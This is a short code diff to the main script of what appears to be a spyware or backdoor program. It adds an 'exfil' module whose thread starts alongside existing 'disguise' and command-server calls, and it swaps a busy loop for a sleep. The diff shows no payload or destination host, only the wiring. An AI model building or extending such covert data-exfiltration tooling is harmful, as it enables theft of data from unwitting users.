@@ -9,6 +9,7 @@ import signal
 import config
 import spyFunctions
 import recvFunctions
+import exfil
 # import sendFunctions
 # import utils
 
@@ -17,9 +18,11 @@ running = True
 def main(argv):
 	spyFunctions.disguise()
 	recvFunctions.startServer()
+	exfil.startThread()
+
 	try:
 		while(True):
-			pass
+			time.sleep(1)
 	except (KeyboardInterrupt, SystemExit):
 		sys.exit()
 
